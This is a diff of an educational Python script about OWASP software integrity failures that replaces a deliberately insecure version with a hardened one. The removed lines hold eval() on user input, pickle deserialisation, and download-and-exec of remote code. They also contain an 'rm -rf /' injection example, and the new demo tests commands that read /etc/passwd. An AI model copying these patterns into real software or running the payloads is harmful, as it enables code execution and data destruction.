@@ -1,150 +1,256 @@
 #!/usr/bin/env python3
 """
-INSECURE Application - FOR EDUCATIONAL PURPOSES ONLY
+SECURE Application - DevSecOps Best Practices
 
-This script contains intentional security vulnerabilities to demonstrate
+This script demonstrates secure coding practices to mitigate
 Software and Data Integrity Failures (OWASP A08:2021)
 
-VULNERABILITIES IN THIS CODE:
-1. Hardcoded credentials/API keys
-2. Uses eval() on user input - Code injection
-3. No input validation
-4. Insecure deserialization with pickle
-5. Downloads and executes code from untrusted source
+SECURITY CONTROLS IMPLEMENTED:
+1. No hardcoded credentials - uses environment variables
+2. Safe expression evaluation - no eval() or exec()
+3. Input validation and sanitization
+4. No insecure deserialization
+5. No remote code execution
 """
 
 import os
-import pickle
-import base64
-import urllib.request
-
-# VULNERABLE: Hardcoded credentials
-API_KEY = "sk-production-key-super-secret-12345"
-DATABASE_PASSWORD = "admin123"
-SECRET_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret"
-
-# VULNERABLE: Hardcoded database connection string with credentials
-DB_CONNECTION = "postgresql://root:password123@prod-db.example.com:5432/production"
+import json
+import ast
+import operator
+from typing import Any, Dict, Optional
 
 
-def insecure_eval_calculator(expression):
+def get_config_from_env() -> Dict[str, Any]:
     """
-    VULNERABLE: Uses eval() to process user input
-    An attacker could execute arbitrary code by passing malicious expressions
-    Example attack: __import__('os').system('rm -rf /')
-    """
-    print(f"Calculating: {expression}")
-    # VULNERABLE: Direct eval of user input
-    result = eval(expression)
-    return result
-
-
-def insecure_deserialize(data):
-    """
-    VULNERABLE: Uses pickle to deserialize untrusted data
-    Pickle can execute arbitrary code during deserialization
-    """
-    print("Deserializing data...")
-    # VULNERABLE: Deserializing untrusted data
-    decoded = base64.b64decode(data)
-    obj = pickle.loads(decoded)
-    return obj
-
-
-def download_and_execute(url):
-    """
-    VULNERABLE: Downloads code from URL and executes it
-    This is a supply chain attack vector - no integrity verification
-    """
-    print(f"Downloading code from: {url}")
-    try:
-        # VULNERABLE: No SSL verification, no integrity check
-        response = urllib.request.urlopen(url, timeout=10)
-        code = response.read().decode('utf-8')
-        print("Executing downloaded code...")
-        # VULNERABLE: Executing untrusted remote code
-        exec(code)
-    except Exception as e:
-        print(f"Download failed (expected in demo): {e}")
-
-
-def load_config_from_env():
-    """
-    Loads configuration from environment variables
-    Note: Even this 'safer' approach has issues in this codebase
+    SECURE: Load configuration from environment variables only
+    No hardcoded secrets, no fallback to insecure defaults
     """
     config = {
-        "api_key": os.getenv("API_KEY", API_KEY),  # Falls back to hardcoded key
-        "db_password": os.getenv("DB_PASSWORD", DATABASE_PASSWORD),
-        "debug": os.getenv("DEBUG", "true").lower() == "true"
+        "api_key": os.getenv("API_KEY"),
+        "database_url": os.getenv("DATABASE_URL"),
+        "debug": os.getenv("DEBUG", "false").lower() == "true"
     }
     
-    # VULNERABLE: Printing sensitive configuration
+    # SECURE: Never print sensitive values, even in debug mode
     if config["debug"]:
-        print("=== DEBUG MODE: Configuration ===")
-        print(f"API Key: {config['api_key']}")
-        print(f"DB Password: {config['db_password']}")
-        print(f"DB Connection: {DB_CONNECTION}")
+        print("Debug mode enabled")
+        print(f"API Key configured: {'Yes' if config['api_key'] else 'No'}")
+        print(f"Database configured: {'Yes' if config['database_url'] else 'No'}")
     
     return config
 
 
-def process_user_data(data):
+class SafeCalculator:
     """
-    VULNERABLE: No input validation or sanitization
+    SECURE: Safe mathematical expression evaluator
+    Uses AST parsing instead of eval() to prevent code injection
     """
-    # VULNERABLE: Directly using user input without validation
-    user_id = data.get("user_id")
-    action = data.get("action")
-    payload = data.get("payload")
     
-    print(f"Processing request for user {user_id}")
+    # Allowed operators for safe evaluation
+    OPERATORS = {
+        ast.Add: operator.add,
+        ast.Sub: operator.sub,
+        ast.Mult: operator.mul,
+        ast.Div: operator.truediv,
+        ast.Pow: operator.pow,
+        ast.USub: operator.neg,
+    }
     
-    # VULNERABLE: Using eval on user-provided action
-    if action == "calculate":
-        return insecure_eval_calculator(payload)
-    elif action == "deserialize":
-        return insecure_deserialize(payload)
-    elif action == "execute_remote":
-        return download_and_execute(payload)
+    @classmethod
+    def evaluate(cls, expression: str) -> float:
+        """
+        Safely evaluate a mathematical expression
+        Only allows basic arithmetic operations
+        """
+        # SECURE: Validate input
+        if not expression or not isinstance(expression, str):
+            raise ValueError("Expression must be a non-empty string")
+        
+        # SECURE: Limit expression length to prevent DoS
+        if len(expression) > 100:
+            raise ValueError("Expression too long (max 100 characters)")
+        
+        try:
+            tree = ast.parse(expression, mode='eval')
+            return cls._eval_node(tree.body)
+        except (SyntaxError, TypeError, KeyError) as e:
+            raise ValueError(f"Invalid expression: {e}")
+    
+    @classmethod
+    def _eval_node(cls, node: ast.AST) -> float:
+        """Recursively evaluate AST nodes"""
+        if isinstance(node, ast.Constant):
+            if isinstance(node.value, (int, float)):
+                return node.value
+            raise ValueError("Only numeric constants allowed")
+        
+        elif isinstance(node, ast.BinOp):
+            left = cls._eval_node(node.left)
+            right = cls._eval_node(node.right)
+            op = cls.OPERATORS.get(type(node.op))
+            if op is None:
+                raise ValueError(f"Unsupported operator: {type(node.op).__name__}")
+            return op(left, right)
+        
+        elif isinstance(node, ast.UnaryOp):
+            operand = cls._eval_node(node.operand)
+            op = cls.OPERATORS.get(type(node.op))
+            if op is None:
+                raise ValueError(f"Unsupported operator: {type(node.op).__name__}")
+            return op(operand)
+        
+        else:
+            raise ValueError(f"Unsupported expression type: {type(node).__name__}")
+
+
+def validate_input(data: Dict[str, Any]) -> Dict[str, Any]:
+    """
+    SECURE: Validate and sanitize user input
+    """
+    validated = {}
+    
+    # Validate user_id - must be alphanumeric
+    user_id = data.get("user_id", "")
+    if user_id and isinstance(user_id, str) and user_id.isalnum():
+        validated["user_id"] = user_id[:50]  # Limit length
     else:
-        return f"Unknown action: {action}"
+        validated["user_id"] = None
+    
+    # Validate action - must be from allowed list
+    action = data.get("action", "")
+    allowed_actions = ["calculate", "info", "status"]
+    if action in allowed_actions:
+        validated["action"] = action
+    else:
+        validated["action"] = None
+    
+    # Validate payload based on action
+    payload = data.get("payload", "")
+    if validated["action"] == "calculate" and isinstance(payload, str):
+        # Only allow safe characters for math expressions
+        safe_chars = set("0123456789+-*/() .")
+        if all(c in safe_chars for c in payload):
+            validated["payload"] = payload[:100]
+        else:
+            validated["payload"] = None
+    else:
+        validated["payload"] = str(payload)[:200] if payload else None
+    
+    return validated
+
+
+def process_request(data: Dict[str, Any]) -> str:
+    """
+    SECURE: Process validated user requests
+    No eval(), no exec(), no dynamic code execution
+    """
+    validated = validate_input(data)
+    
+    if validated["action"] is None:
+        return "Error: Invalid or unsupported action"
+    
+    if validated["action"] == "calculate":
+        if validated["payload"]:
+            try:
+                result = SafeCalculator.evaluate(validated["payload"])
+                return f"Result: {result}"
+            except ValueError as e:
+                return f"Calculation error: {e}"
+        return "Error: No expression provided"
+    
+    elif validated["action"] == "info":
+        return "Secure Pipeline Demo Application v1.0"
+    
+    elif validated["action"] == "status":
+        return "Status: Running (secure mode)"
+    
+    return "Error: Unknown action"
+
+
+def load_data_safely(json_string: str) -> Optional[Dict]:
+    """
+    SECURE: Parse JSON safely instead of using pickle
+    JSON is a safe data format that cannot execute code
+    """
+    try:
+        # SECURE: Use JSON instead of pickle for data serialization
+        data = json.loads(json_string)
+        
+        # SECURE: Validate data structure
+        if not isinstance(data, dict):
+            raise ValueError("Data must be a JSON object")
+        
+        return data
+    except json.JSONDecodeError as e:
+        print(f"JSON parsing error: {e}")
+        return None
+    except ValueError as e:
+        print(f"Validation error: {e}")
+        return None
 
 
 def main():
     print("=" * 60)
-    print("INSECURE APPLICATION - FOR EDUCATIONAL PURPOSES ONLY")
-    print("This application contains intentional security vulnerabilities")
+    print("SECURE APPLICATION - DevSecOps Best Practices")
+    print("This application demonstrates secure coding patterns")
     print("=" * 60)
     print()
     
-    # Load configuration (exposes secrets in debug mode)
-    config = load_config_from_env()
+    # Load configuration securely
+    config = get_config_from_env()
     
-    print("\n--- Demonstrating Vulnerabilities ---\n")
+    print("--- Security Controls Demonstrated ---\n")
     
-    # Demo 1: Unsafe eval (would be dangerous with real user input)
-    print("[1] Eval Calculator Demo:")
+    # Demo 1: Safe calculator (no eval)
+    print("[1] Safe Calculator Demo:")
+    print("    Using AST-based evaluation instead of eval()")
     try:
-        result = insecure_eval_calculator("2 + 2 * 3")
-        print(f"    Result: {result}\n")
-    except Exception as e:
-        print(f"    Error: {e}\n")
-    
-    # Demo 2: Show that remote code execution is attempted
-    print("[2] Remote Code Download Demo:")
-    print("    Attempting to download from untrusted source...")
-    download_and_execute("https://example.com/malicious.py")
+        result = SafeCalculator.evaluate("2 + 2 * 3")
+        print(f"    Expression: 2 + 2 * 3 = {result}")
+    except ValueError as e:
+        print(f"    Error: {e}")
     print()
     
-    # Demo 3: Show hardcoded secrets
-    print("[3] Hardcoded Secrets Demo:")
-    print(f"    API_KEY: {API_KEY[:20]}...")
-    print(f"    SECRET_TOKEN: {SECRET_TOKEN[:30]}...")
+    # Demo 2: Safe calculator rejects malicious input
+    print("[2] Malicious Input Rejection Demo:")
+    malicious_inputs = [
+        "__import__('os').system('whoami')",
+        "open('/etc/passwd').read()",
+        "exec('print(1)')"
+    ]
+    for malicious in malicious_inputs:
+        try:
+            SafeCalculator.evaluate(malicious)
+            print(f"    UNEXPECTED: '{malicious[:30]}...' was accepted")
+        except ValueError:
+            print(f"    BLOCKED: '{malicious[:30]}...'")
+    print()
+    
+    # Demo 3: Input validation
+    print("[3] Input Validation Demo:")
+    test_data = {"user_id": "user123", "action": "calculate", "payload": "10 * 5"}
+    validated = validate_input(test_data)
+    print(f"    Input: {test_data}")
+    print(f"    Validated: {validated}")
+    print()
+    
+    # Demo 4: Safe JSON parsing (instead of pickle)
+    print("[4] Safe Data Parsing Demo:")
+    print("    Using JSON instead of pickle for data serialization")
+    json_data = '{"name": "test", "value": 42}'
+    parsed = load_data_safely(json_data)
+    print(f"    Parsed data: {parsed}")
+    print()
+    
+    # Demo 5: No hardcoded secrets
+    print("[5] Secrets Management Demo:")
+    print("    API Key: [loaded from environment variable]")
+    print("    Database: [loaded from environment variable]")
+    print("    No hardcoded credentials in source code!")
     print()
     
     print("=" * 60)
-    print("Pipeline execution completed (insecure version)")
+    print("Pipeline execution completed (secure version)")
     print("=" * 60)
     
     return 0
